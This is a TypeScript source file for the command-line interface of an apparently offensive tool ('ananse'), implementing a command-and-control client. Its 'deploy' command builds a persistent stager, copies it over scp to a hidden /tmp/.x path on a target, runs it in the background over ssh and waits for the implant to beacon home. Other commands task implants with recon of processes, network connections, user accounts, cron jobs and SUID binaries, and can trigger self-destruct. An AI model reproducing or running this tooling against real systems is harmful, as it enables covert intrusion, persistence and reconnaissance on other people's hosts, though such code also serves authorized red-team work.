import { Command } from "commander";
import picocolors from "picocolors";
import WebSocket from "ws";
import { existsSync } from "node:fs";
import { dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { C2Client, resolveClientConfig } from "./api.js";

// ---------------------------------------------------------------------------
// Recon result formatter — structures raw module output into readable sections
// ---------------------------------------------------------------------------

const RECON_HEADER_RE = /^=== (\w+) ===$/gm;

interface ReconSection {
  name: string;
  body: string;
}

interface KnownPort {
  port: number;
  name: string;
}

const WELL_KNOWN_PORTS: KnownPort[] = [
  { port: 22, name: "SSH" },
  { port: 23, name: "Telnet" },
  { port: 80, name: "HTTP" },
  { port: 443, name: "HTTPS" },
  { port: 8443, name: "HTTPS-alt" },
  { port: 3306, name: "MySQL" },
  { port: 5432, name: "PostgreSQL" },
  { port: 6379, name: "Redis" },
  { port: 27017, name: "MongoDB" },
  { port: 3389, name: "RDP" },
  { port: 5900, name: "VNC" },
  { port: 8080, name: "HTTP-proxy" },
  { port: 9090, name: "Prometheus" },
  { port: 3000, name: "Dashboard" },
  { port: 5000, name: "Docker-reg" },
  { port: 9001, name: "Tor" },
];

function describePort(port: number): string {
  const known = WELL_KNOWN_PORTS.find((p) => p.port === port);
  return known ? `${known.name}` : "";
}

function parseReconSections(raw: string): ReconSection[] | null {
  const lines = raw.split("\n");
  const sections: ReconSection[] = [];
  let current: ReconSection | null = null;
  const body: string[] = [];

  // Check if this looks like structured recon output
  let hasHeader = false;
  for (const line of lines) {
    const m = line.match(/^=== (\w+) ===$/);
    if (m) {
      if (current) {
        current.body = body.join("\n").trim();
      }
      hasHeader = true;
      current = { name: m[1], body: "" };
      sections.push(current);
      body.length = 0;
    } else if (current) {
      body.push(line);
    }
  }
  if (current) {
    current.body = body.join("\n").trim();
  }

  return hasHeader ? sections : null;
}

function formatProcesses(body: string): string {
  const lines = body.split("\n").filter((l) => l.trim());
  const kernel: string[] = [];
  const user: string[] = [];
  let header = "";

  for (const line of lines) {
    if (line.startsWith("USER") || line.startsWith("PID")) {
      header = line;
      continue;
    }
    // Kernel threads have bracketed names like [kthreadd] or start with "root" and contain brackets
    if (line.includes("[") && line.includes("]")) {
      kernel.push(line);
    } else {
      user.push(line);
    }
  }

  const parts: string[] = [];
  if (header) parts.push(picocolors.dim(header));
  // Show up to 60 user process lines
  if (user.length > 0) {
    parts.push(...user.slice(0, 60));
    if (user.length > 60) {
      parts.push(picocolors.dim(`  ... and ${user.length - 60} more user processes`));
    }
  }
  if (kernel.length > 0) {
    parts.push(picocolors.dim(`  (${kernel.length} kernel threads hidden)`));
  }
  return parts.join("\n");
}

function formatNetwork(body: string): string {
  const lines = body.split("\n").filter((l) => l.trim());
  const listening: string[] = [];
  const established: string[] = [];
  const other: string[] = [];
  const headers: string[] = [];

  for (const line of lines) {
    if (line.startsWith("State") || line.startsWith("Recv-Q") || line === "---") {
      headers.push(line);
      continue;
    }
    if (line.includes("LISTEN")) {
      listening.push(line);
    } else if (line.includes("ESTAB")) {
      established.push(line);
    } else if (/^\d+:[\da-fA-F]+/.test(line.trim())) {
      // /proc/net/tcp raw lines — skip these, they're redundant with ss
      continue;
    } else {
      other.push(line);
    }
  }

  const parts: string[] = [];
  if (listening.length > 0) {
    parts.push(picocolors.cyan("  LISTENING PORTS"));
    parts.push(picocolors.dim("  ───────────────"));
    for (const l of listening) {
      // Try to annotate with service name
      const portMatch = l.match(/:(\d+)\s/);
      let annotation = "";
      if (portMatch) {
        const info = describePort(parseInt(portMatch[1], 10));
        if (info) annotation = picocolors.green(`  ← ${info}`);
      }
      parts.push(`  ${l}${annotation}`);
    }
  }
  if (established.length > 0) {
    parts.push(picocolors.yellow("  CONNECTIONS"));
    parts.push(picocolors.dim("  ────────────"));
    for (const e of established) {
      parts.push(`  ${e}`);
    }
  }
  if (other.length > 0) {
    const filtered = other.filter((l) => !l.startsWith("/proc/") && l !== "---");
    if (filtered.length > 0) {
      parts.push(picocolors.dim("  Other network info"));
      for (const o of filtered) {
        parts.push(`  ${o}`);
      }
    }
  }
  return parts.join("\n");
}

function formatUsers(body: string): string {
  const lines = body.split("\n");
  const passwd: string[] = [];
  const logins: string[] = [];
  const others: string[] = [];
  let section = "passwd";

  for (const line of lines) {
    const t = line.trim();
    if (t === "---LOGIN---") { section = "login"; continue; }
    if (t === "---LAST---") { section = "last"; continue; }

    if (section === "passwd" && t) {
      passwd.push(t);
    } else if (section === "login" && t) {
      logins.push(t);
    } else if (t) {
      others.push(t);
    }
  }

  const parts: string[] = [];

  // Parse /etc/passwd for human users
  const humanUsers: string[] = [];
  const serviceUsers: string[] = [];
  for (const line of passwd) {
    const fields = line.split(":");
    if (fields.length < 7) continue;
    const shell = fields[6];
    const uid = parseInt(fields[2], 10);
    if (uid === 0 || shell?.endsWith("/bash") || shell?.endsWith("/zsh") || shell?.endsWith("/sh") || shell?.endsWith("/fish")) {
      const note = uid === 0 && fields[0] !== "root" ? picocolors.red(" ← non-root UID 0!") : "";
      humanUsers.push(`  ${fields[0]}:uid=${fields[2]} shell=${shell}${note}`);
    } else if (uid >= 1000 && uid < 65534) {
      humanUsers.push(`  ${fields[0]}:uid=${fields[2]} shell=${shell}`);
    } else {
      serviceUsers.push(fields[0]);
    }
  }

  if (humanUsers.length > 0) {
    parts.push(picocolors.cyan("  HUMAN / PRIVILEGED USERS"));
    parts.push(picocolors.dim("  ─────────────────────────"));
    parts.push(...humanUsers);
  }
  if (serviceUsers.length > 0) {
    parts.push(picocolors.dim(`  (${serviceUsers.length} service accounts — ${serviceUsers.join(", ")})`));
  }

  if (logins.length > 0) {
    const active = logins.filter((l) => !l.startsWith("USER") && !l.startsWith("w ") && l.length > 10 && !l.includes("from"));
    if (active.length > 0) {
      parts.push(picocolors.yellow("  ACTIVE SESSIONS"));
      parts.push(picocolors.dim("  ───────────────"));
      parts.push(...logins);
    }
  }

  return parts.join("\n");
}

function formatCron(body: string): string {
  const lines = body.split("\n");
  const cronFiles: string[] = [];
  const crontabs: string[] = [];
  const systemd: string[] = [];
  let section = "files";

  for (const line of lines) {
    const t = line.trim();
    if (t === "---CRONTAB---") { section = "crontab"; continue; }
    if (t === "---SYSTEMD---") { section = "systemd"; continue; }
    if (!t) continue;

    if (section === "files") {
      cronFiles.push(t);
    } else if (section === "crontab") {
      if (!t.includes("no crontab")) crontabs.push(t);
    } else if (section === "systemd") {
      if (t.startsWith("NEXT") || t.startsWith("━") || t.startsWith("─")) continue;
      systemd.push(t);
    }
  }

  const parts: string[] = [];

  if (cronFiles.length > 0) {
    parts.push(picocolors.cyan("  CRON FILES"));
    parts.push(picocolors.dim("  ──────────"));
    parts.push(...cronFiles.map((l) => `  ${l}`));
  }

  if (crontabs.length > 0) {
    const nonEmpty = crontabs.filter((l) => !l.startsWith("#") && l.trim());
    if (nonEmpty.length > 0) {
      parts.push(picocolors.yellow("  ACTIVE CRONTAB ENTRIES"));
      parts.push(picocolors.dim("  ──────────────────────"));
      parts.push(...crontabs.map((l) => `  ${l}`));
    }
  }

  if (systemd.length > 0) {
    parts.push(picocolors.cyan("  SYSTEMD TIMERS"));
    parts.push(picocolors.dim("  ──────────────"));
    // Skip header line from systemctl
    const data = systemd.filter((l) => !l.startsWith("UNIT") && !l.includes("─") && !l.includes("timer"));
    parts.push(...data.map((l) => `  ${l}`));
  }

  return parts.join("\n");
}

function formatSuid(body: string): string {
  const lines = body.split("\n").filter((l) => l.trim());
  if (lines.length === 0 || (lines.length === 1 && lines[0].includes("Permission denied"))) {
    return picocolors.dim("  (no SUID/SGID binaries found or search restricted)");
  }
  const parts: string[] = [picocolors.yellow("  SUID/SGID BINARIES")];
  parts.push(picocolors.dim("  ───────────────────"));
  parts.push(...lines.map((l) => `  ${l}`));
  return parts.join("\n");
}

function formatReconResult(taskType: string, data: string): string {
  // Normalise task type: "recon_all", "recon_processes", "recon_network", etc.
  const baseType = taskType.replace(/^recon_?/i, "recon_").toLowerCase();
  const sections = parseReconSections(data);

  if (!sections) {
    // Single-module recon or non-recon output — format based on type
    const formatter = formatters[baseType as keyof typeof formatters];
    if (formatter) {
      const header = baseType.replace("recon_", "").toUpperCase();
      const out: string[] = [];
      out.push(`  ${picocolors.white("╔")}${picocolors.cyan("═".repeat(56))}${picocolors.white("╗")}`);
      out.push(`  ${picocolors.white("║")} ${picocolors.bold(picocolors.cyan(reconLabel(header)))}${picocolors.white("║".repeat(Math.max(1, 57 - reconLabel(header).length - 2)))}`);
      out.push(`  ${picocolors.white("╚")}${picocolors.cyan("═".repeat(56))}${picocolors.white("╝")}`);
      out.push(formatter(data));
      return out.join("\n");
    }
    return data;
  }

  // Multi-section recon_all output
  const out: string[] = [];
  for (const sec of sections) {
    const formatter = sectionFormatters[sec.name as keyof typeof sectionFormatters];
    const formatted = formatter ? formatter(sec.body) : sec.body;

    out.push(`  ${picocolors.white("╔")}${picocolors.cyan("═".repeat(56))}${picocolors.white("╗")}`);
    out.push(`  ${picocolors.white("║")} ${picocolors.bold(picocolors.cyan(sec.name.padEnd(55)))}${picocolors.white("║")}`);
    out.push(`  ${picocolors.white("╚")}${picocolors.cyan("═".repeat(56))}${picocolors.white("╝")}`);
    if (formatted) {
      out.push(formatted);
    } else {
      out.push(picocolors.dim("  (empty)"));
    }
    out.push(""); // blank line between sections
  }
  return out.join("\n");
}

function reconLabel(s: string): string {
  const labels: Record<string, string> = {
    PROCESSES: "Processes",
    NETWORK: "Network Connections",
    USERS: "User Accounts",
    CRON: "Scheduled Tasks",
    SUID: "SUID/SGID Binaries",
  };
  return labels[s] ?? s;
}

const sectionFormatters: Record<string, (body: string) => string> = {
  PROCESSES: formatProcesses,
  NETWORK: formatNetwork,
  USERS: formatUsers,
  CRON: formatCron,
  SUID: formatSuid,
};

const formatters: Record<string, (body: string) => string> = {
  recon_processes: formatProcesses,
  recon_network: formatNetwork,
  recon_users: formatUsers,
  recon_cron: formatCron,
  recon_suid: formatSuid,
};

/** Create the `ananse c2` command group with subcommands. */
export function createC2Command(): Command {
  const c2 = new Command("c2")
    .description(`${picocolors.red("[offense]")} C2 server operations — manage implants and tasks`)
    .option("--server <url>", "C2 server URL", process.env.C2_SERVER_URL)
    .option("--key <key>", "C2 API key", process.env.C2_API_KEY);

  // --- reach ---
  c2
    .command("reach")
    .description("List all registered implants")
    .action(async (_opts: Record<string, unknown>, cmd: Command) => {
      const global = cmd.parent?.opts() ?? {};
      const cfg = resolveClientConfig(global.server, global.key);
      const client = new C2Client(cfg);

      try {
        const summary = await client.reach();
        console.log(picocolors.cyan(`\n  Reach: ${summary.total} total, ${picocolors.green(String(summary.active))} active, ${picocolors.red(String(summary.dead))} dead\n`));
        for (const imp of summary.implants) {
          const color = imp.status === "active" ? picocolors.green : imp.status === "dead" ? picocolors.red : picocolors.dim;
          const seen = new Date(imp.lastSeen).toLocaleString();
          console.log(`  ${color(imp.id.padEnd(20))} ${color(imp.status.padEnd(8))} last: ${picocolors.dim(seen)}`);
        }
        if (summary.implants.length === 0) console.log("  (no implants registered)");
        console.log("");
      } catch (err) {
        console.error(picocolors.red(`\n  Error: ${(err as Error).message}\n`));
      }
    });

  // --- task group ---
  const task = new Command("task").description("Manage C2 tasks");

  task
    .command("create <implant-id> <type>")
    .description("Create a new task for an implant")
    .option("-p, --params <json>", "Task parameters as JSON string", "{}")
    .action(async (implantId: string, type: string, opts: { params?: string }, cmd: Command) => {
      const global = cmd.parent?.parent?.opts() ?? {};
      const cfg = resolveClientConfig(global.server, global.key);
      const client = new C2Client(cfg);

      try {
        const params = JSON.parse(opts.params ?? "{}");
        const task = await client.taskCreate({ implantId, type, params });
        console.log(picocolors.green(`\n  Task created: ${picocolors.white(task.taskId)}`));
        console.log(`  Type: ${type} | Status: ${task.status}\n`);
      } catch (err) {
        console.error(picocolors.red(`\n  Error: ${(err as Error).message}\n`));
      }
    });

  task
    .command("list [implant-id]")
    .description("List tasks, optionally filtered by implant")
    .action(async (implantId: string | undefined, _opts: Record<string, unknown>, cmd: Command) => {
      const global = cmd.parent?.parent?.opts() ?? {};
      const cfg = resolveClientConfig(global.server, global.key);
      const client = new C2Client(cfg);

      try {
        const tasks = await client.taskList(implantId);
        console.log(picocolors.cyan(`\n  Tasks: ${tasks.length} total\n`));
        for (const t of tasks) {
          const color = t.status === "completed" ? picocolors.green : t.status === "failed" ? picocolors.red : picocolors.yellow;
          const created = new Date(t.createdAt).toLocaleString();
          console.log(`  ${color(t.taskId.slice(0, 8))} ${t.type.padEnd(20)} ${color(t.status.padEnd(10))} ${picocolors.dim(created)}`);
        }
        if (tasks.length === 0) console.log("  (no tasks)");
        console.log("");
      } catch (err) {
        console.error(picocolors.red(`\n  Error: ${(err as Error).message}\n`));
      }
    });

  task
    .command("cancel <task-id>")
    .description("Cancel a pending task")
    .action(async (taskId: string, _opts: Record<string, unknown>, cmd: Command) => {
      const global = cmd.parent?.parent?.opts() ?? {};
      const cfg = resolveClientConfig(global.server, global.key);
      const client = new C2Client(cfg);

      try {
        const ok = await client.taskCancel(taskId);
        if (ok) {
          console.log(picocolors.green(`\n  Task ${picocolors.white(taskId.slice(0, 8))} cancelled.\n`));
        } else {
          console.log(picocolors.yellow(`\n  Task not found or already completed.\n`));
        }
      } catch (err) {
        console.error(picocolors.red(`\n  Error: ${(err as Error).message}\n`));
      }
    });

  // --- task result ---
  task
    .command("result <task-id>")
    .description("View full task result output")
    .action(async (taskId: string, _opts: Record<string, unknown>, cmd: Command) => {
      const global = cmd.parent?.parent?.opts() ?? {};
      const cfg = resolveClientConfig(global.server, global.key);
      const client = new C2Client(cfg);

      try {
        const task = await client.taskDetail(taskId);
        if (!task) {
          console.log(picocolors.yellow(`\n  Task not found.\n`));
          return;
        }

        console.log(`\n  ${picocolors.cyan("Task:")}     ${taskId}`);
        console.log(`  ${picocolors.cyan("Type:")}     ${task.type}`);
        console.log(`  ${picocolors.cyan("Status:")}   ${colorStatus(task.status)}`);
        console.log(`  ${picocolors.cyan("Created:")}  ${new Date(task.createdAt).toLocaleString()}`);
        if (task.completedAt) console.log(`  ${picocolors.cyan("Completed:")} ${new Date(task.completedAt).toLocaleString()}`);

        if (task.result) {
          if (task.result.success) {
            displayFormattedResult(task.type, task.result.data);
          } else {
            console.log(`\n  ${picocolors.red("╔" + "═".repeat(56) + "╗")}`);
            console.log(`  ${picocolors.red("║ FAILED")}`);
            console.log(`  ${picocolors.red("╚" + "═".repeat(56) + "╝")}`);
            console.log(`  ${picocolors.red(task.result.error ?? "failed with no error")}`);
            if (task.result.data) displayFormattedResult(task.type, task.result.data);
          }
        } else {
          console.log(`\n  (no result yet)\n`);
        }
      } catch (err) {
        console.error(picocolors.red(`\n  Error: ${(err as Error).message}\n`));
      }
    });

  // --- task run (create + wait) ---
  task
    .command("run <implant-id> <type>")
    .description("Create a task and wait for its result")
    .option("-p, --params <json>", "Task parameters as JSON string", "{}")
    .option("-t, --timeout <seconds>", "Max wait time in seconds", "120")
    .option("--poll <ms>", "Poll interval in ms", "2000")
    .action(async (implantId: string, type: string, opts: { params?: string; timeout?: string; poll?: string }, cmd: Command) => {
      const global = cmd.parent?.parent?.opts() ?? {};
      const cfg = resolveClientConfig(global.server, global.key);
      const client = new C2Client(cfg);

      try {
        const params = JSON.parse(opts.params ?? "{}");
        const timeout = parseInt(opts.timeout ?? "120", 10) * 1000;
        const pollMs = parseInt(opts.poll ?? "2000", 10);

        // Create the task
        const task = await client.taskCreate({ implantId, type, params });
        console.log(picocolors.green(`\n  Task created: ${picocolors.white(task.taskId)}`));
        console.log(`  Waiting for result (timeout: ${Math.round(timeout / 1000)}s)...`);

        // Poll until completion
        const deadline = Date.now() + timeout;
        let lastStatus = task.status;

        while (Date.now() < deadline) {
          await sleep(pollMs);

          const updated = await client.taskDetail(task.taskId);
          if (!updated) {
            console.log(picocolors.yellow(`\n  Task disappeared.\n`));
            return;
          }

          if (updated.status !== lastStatus) {
            console.log(`  Status: ${colorStatus(updated.status)}`);
            lastStatus = updated.status;
          }

          if (updated.status === "completed" || updated.status === "failed") {
            if (updated.result?.success) {
              displayFormattedResult(updated.type, updated.result.data);
            } else if (updated.result) {
              console.log(`\n  ${picocolors.red("╔" + "═".repeat(56) + "╗")}`);
              console.log(`  ${picocolors.red("║ FAILED")}`);
              console.log(`  ${picocolors.red("╚" + "═".repeat(56) + "╝")}`);
              console.log(`  ${picocolors.red(updated.result.error ?? "failed")}`);
              if (updated.result.data) displayFormattedResult(updated.type, updated.result.data);
            } else {
              console.log(`\n  ${updated.status === "completed" ? "Completed" : "Failed"} (no result data)`);
            }
            console.log(`  ${updated.status === "completed" ? picocolors.green("✔ Done") : picocolors.red("✖ Failed")} — ${updated.completedAt ? new Date(updated.completedAt).toLocaleString() : ""}\n`);
            return;
          }
        }

        console.log(picocolors.yellow(`\n  Timed out after ${Math.round(timeout / 1000)}s. Task is still ${lastStatus}.\n`));
      } catch (err) {
        console.error(picocolors.red(`\n  Error: ${(err as Error).message}\n`));
      }
    });

  c2.addCommand(task);

  // --- deploy ---
  c2
    .command("deploy <user-host>")
    .description("Build stager, deploy to target, and wait for beacon")
    .option("--port <number>", "SSH port", "22")
    .option("--key <path>", "SSH identity file")
    .option("--remote-path <path>", "Remote path for stager", "/tmp/.x")
    .option("--build-only", "Only build, don't deploy")
    .option("--wait <seconds>", "Seconds to wait for beacon", "30")
    .action(async (userHost: string, opts: { port?: string; key?: string; remotePath?: string; buildOnly?: boolean; wait?: string }, cmd: Command) => {
      const global = cmd.parent?.opts() ?? {};
      const cfg = resolveClientConfig(global.server, global.key);
      const client = new C2Client(cfg);

      // Determine server address for the stager
      // Use --target-server if set, otherwise derive from C2_SERVER_URL
      // The target needs to reach the C2 server — default to the raw host:port
      const serverMatch = cfg.serverUrl.match(/https?:\/\/([^\/]+)/);
      const rawServer = serverMatch ? serverMatch[1] : "localhost:8443";

      console.log(`\n  ${picocolors.cyan("==>")} Building stager for ${picocolors.white(rawServer)}...`);

      // Find project root
      const projectRoot = findProjectRoot();
      if (!projectRoot) {
        console.error(picocolors.red(`\n  Error: can't find project root.\n`));
        return;
      }

      const buildScript = `${projectRoot}/scripts/build-stager.sh`;

      // Build stager with the target server address
      const { execSync } = await import("node:child_process");
      const buildArgs = [
        buildScript,
        "--server", rawServer,
        "--token", cfg.apiKey, // reuse API key as stager token for simplicity
        "--implant-token", process.env.C2_IMPLANT_TOKEN || "imp-token-change-me",
        "--persist",
      ];

      try {
        execSync(buildArgs.join(" "), { stdio: "inherit", cwd: projectRoot });
      } catch {
        console.error(picocolors.red(`\n  Build failed.\n`));
        return;
      }

      if (opts.buildOnly) {
        console.log(picocolors.green(`\n  Built: /tmp/implant-linux + /tmp/stager-linux\n`));
        return;
      }

      // Deploy (Linux target only — stager requires memfd_create)
      const sshPort = opts.port ?? "22";
      const remotePath = opts.remotePath ?? "/tmp/.x";
      const identityArg = opts.key ? `-i ${opts.key}` : "";
      const stagerPath = "/tmp/stager-linux";

      console.log(`  ${picocolors.cyan("==>")} Copying stager to ${picocolors.white(userHost)}:${remotePath}...`);

      try {
        execSync(
          `scp ${identityArg} -P ${sshPort} -q ${stagerPath} "${userHost}:${remotePath}"`,
          { stdio: "inherit", cwd: projectRoot, timeout: 30_000 },
        );
      } catch {
        console.error(picocolors.red(`\n  SCP failed. Check SSH credentials and target address.\n`));
        return;
      }

      console.log(`  ${picocolors.cyan("==>")} Executing stager on ${picocolors.white(userHost)}...`);

      try {
        execSync(
          `ssh ${identityArg} -p ${sshPort} "${userHost}" "chmod +x ${remotePath} && nohup ${remotePath} >/dev/null 2>&1 &"`,
          { stdio: "inherit", cwd: projectRoot, timeout: 15_000 },
        );
      } catch {
        console.error(picocolors.red(`\n  SSH execution failed.\n`));
        return;
      }

      // Wait for beacon
      const waitSecs = parseInt(opts.wait ?? "30", 10);
      console.log(`  ${picocolors.cyan("==>")} Waiting up to ${waitSecs}s for first beacon...`);

      const deadline = Date.now() + waitSecs * 1000;
      let deployed: { id: string; name: string } | null = null;

      while (Date.now() < deadline) {
        await sleep(2000);
        try {
          const reach = await client.reach();
          // Find the newest active implant (likely ours)
          const active = reach.implants
            .filter((i: { status: string }) => i.status === "active")
            .sort((a: { firstSeen: string }, b: { firstSeen: string }) => new Date(b.firstSeen).getTime() - new Date(a.firstSeen).getTime());

          if (active.length > 0) {
            deployed = { id: active[0].id, name: active[0].name };
            break;
          }
        } catch {
          // Server might not be ready yet
        }
      }

      if (deployed) {
        console.log(picocolors.green(`\n  ✔ Implant ${picocolors.white(deployed.id)} checked in (active)\n`));
        console.log(`  ${picocolors.dim("Next:")}`);
        console.log(`  ${picocolors.dim("  ananse c2 task create " + deployed.id + " recon_all")}`);
        console.log(`  ${picocolors.dim("  ananse c2 task run    " + deployed.id + " recon_all")}`);
        console.log(`  ${picocolors.dim("  ananse c2 kill        " + deployed.id)}\n`);
      } else {
        console.log(picocolors.yellow(`\n  No beacon received within ${waitSecs}s.`));
        console.log(`  The stager was deployed but the implant may need more time.`);
        console.log(`  Run ${picocolors.white("ananse c2 reach")} to check later.\n`);
      }
    });

  // --- kill ---
  c2
    .command("kill <implant-id>")
    .description("Send self-destruct command to an implant")
    .action(async (implantId: string, _opts: Record<string, unknown>, cmd: Command) => {
      const global = cmd.parent?.opts() ?? {};
      const cfg = resolveClientConfig(global.server, global.key);
      const client = new C2Client(cfg);

      try {
        const taskId = await client.implantKill(implantId);
        console.log(picocolors.red(`\n  Self-destruct queued for ${picocolors.white(implantId)}`));
        console.log(`  Task: ${taskId}\n`);
      } catch (err) {
        console.error(picocolors.red(`\n  Error: ${(err as Error).message}\n`));
      }
    });

  // --- watch ---
  c2
    .command("watch")
    .description("Live-stream implant and task events via WebSocket")
    .action(async (_opts: Record<string, unknown>, cmd: Command) => {
      const global = cmd.parent?.opts() ?? {};
      const cfg = resolveClientConfig(global.server, global.key);

      // Convert http:// to ws://, https:// to wss://
      const wsUrl = cfg.serverUrl.replace(/^http/, "ws") + "/api/v1/operator/ws";
      const ws = new WebSocket(wsUrl);

      let connected = false;

      ws.on("open", () => {
        ws.send(JSON.stringify({ token: cfg.apiKey }));
      });

      ws.on("message", (raw) => {
        const event = JSON.parse(raw.toString());
        const ts = new Date(event.timestamp).toLocaleTimeString();

        if (event.type === "auth_ok") {
          connected = true;
          console.log(picocolors.green(`\n  Connected — listening for events...\n`));
          return;
        }

        const color = eventColor(event.type);
        const icon = eventIcon(event.type);
        console.log(`  ${picocolors.dim(ts)} ${color(icon)} ${color(event.type)} ${formatEventData(event.data)}`);
      });

      ws.on("close", () => {
        if (connected) {
          console.log(picocolors.yellow(`\n  Disconnected.\n`));
        } else {
          console.error(picocolors.red(`\n  Connection failed or auth rejected.\n`));
        }
        process.exit(0);
      });

      ws.on("error", (err) => {
        console.error(picocolors.red(`\n  WebSocket error: ${err.message}\n`));
        process.exit(1);
      });

      // Handle Ctrl+C cleanly
      process.on("SIGINT", () => {
        ws.close();
      });
    });

  return c2;
}

function eventColor(type: string): (s: string) => string {
  if (type.startsWith("implant")) return picocolors.cyan;
  if (type.startsWith("task_completed")) return picocolors.green;
  if (type.startsWith("task_failed") || type.startsWith("alert")) return picocolors.red;
  if (type.startsWith("task")) return picocolors.yellow;
  return picocolors.white;
}

function eventIcon(type: string): string {
  if (type === "implant_registered") return "●";
  if (type === "implant_beacon") return "◐";
  if (type === "implant_killed") return "✕";
  if (type === "task_created") return "+";
  if (type === "task_completed") return "✔";
  if (type === "task_failed") return "✖";
  if (type === "task_cancelled") return "−";
  if (type === "alert") return "!";
  return "•";
}

function formatEventData(data: Record<string, unknown>): string {
  const parts: string[] = [];
  if (data.implantId) parts.push(String(data.implantId).slice(0, 8));
  if (data.taskId) parts.push(String(data.taskId).slice(0, 8));
  if (data.type) parts.push(String(data.type));
  if (data.success !== undefined) parts.push(data.success ? "ok" : "fail");
  if (data.error) parts.push(picocolors.red(String(data.error)));
  return parts.join(" ") || JSON.stringify(data);
}

function colorStatus(status: string): string {
  switch (status) {
    case "completed": return picocolors.green(status);
    case "failed": return picocolors.red(status);
    case "running": return picocolors.yellow(status);
    case "delivered": return picocolors.cyan(status);
    case "pending": return picocolors.dim(status);
    default: return status;
  }
}

function displayFormattedResult(taskType: string, data: string): void {
  const formatted = formatReconResult(taskType, data);
  if (formatted) {
    console.log(`\n  ${formatted}`);
  } else {
    // Fallback: raw output
    console.log(`\n  ${data}`);
  }
}

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function findProjectRoot(): string | null {
  const __filename = fileURLToPath(import.meta.url);
  const __dirname = dirname(__filename);
  let dir = __dirname;
  for (let i = 0; i < 10; i++) {
    if (existsSync(`${dir}/scripts/build-stager.sh`)) return dir;
    const parent = dirname(dir);
    if (parent === dir) return null;
    dir = parent;
  }
  return null;
}
